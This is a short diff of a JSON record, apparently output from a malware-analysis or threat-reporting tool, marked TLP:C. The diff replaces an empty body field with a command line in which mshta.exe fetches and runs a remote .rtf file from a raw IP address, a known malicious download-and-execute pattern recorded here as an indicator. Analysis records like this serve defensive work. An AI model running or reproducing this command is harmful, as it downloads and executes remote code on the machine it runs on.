@@ -79,7 +79,7 @@
       },
       {
         "auto_collapse": false,
-        "body": null,
+        "body": "C:\\Windows\\System32\\mshta.exe http://194.180.174.158/18.01/quicker.rtf",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
